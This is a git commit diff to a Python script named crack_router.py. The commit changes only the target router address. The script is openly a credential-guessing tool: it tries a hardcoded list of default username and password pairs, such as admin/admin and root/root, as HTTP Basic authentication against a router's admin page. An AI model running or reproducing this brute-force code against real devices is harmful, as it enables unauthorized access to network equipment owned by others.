3e83b7427c22b8be4cdc551f1824a7f3f4891e31
aaa <haogefeifei@qq.com>
2015-03-26 16:23:03 +0800

    获取自己的IP

--- Tools/crack_router.py
+++ Tools/crack_router.py
@@ -7,7 +7,7 @@
 import base64
 import urllib2
 password_dic = [["root", "root"], ["admin", "admin"], ["admin", "rootroot"]]
-request = urllib2.Request('http://192.168.1.1')
+request = urllib2.Request('http://192.168.10.1')
 #request.add_header('Authorization', 'Basic YWRtaW46cm9vdHJvb3Q=')
 for item in password_dic:
     psw_base64 = "Basic " + base64.b64encode(item[0] + ":" + item[1])
